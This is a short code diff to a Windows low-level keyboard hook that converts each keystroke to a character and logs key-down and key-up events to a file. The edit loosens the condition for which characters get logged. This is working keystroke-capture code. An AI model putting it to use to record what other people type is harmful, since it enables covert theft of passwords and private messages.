@@ -56,24 +56,25 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         BYTE state[256];
         GetKeyboardState(state); //  needs to be done for ToUnicode
                                  //  to work, even though parameter is supposed to be optional?
-
+        int k = KB_struct_pointer->vkCode;
         WCHAR buf[10] = {0};
         int res = ToUnicode(KB_struct_pointer->vkCode, KB_struct_pointer->scanCode, state, buf, 10, 0);
 
         if (wParam == WM_KEYDOWN)
         {
-            if (res == 1)
+            if (res != 0)
             {
                 LogUnicodeCharToFile(buf, DOWN);
             }
         }
         else if (wParam == WM_KEYUP)
         {
-            if (res == 1)
+            if (res != 0)
             {
                 LogUnicodeCharToFile(buf, UP);
             }
         }
+        
         return CallNextHookEx(NULL, nCode, wParam, lParam);
     }
 }
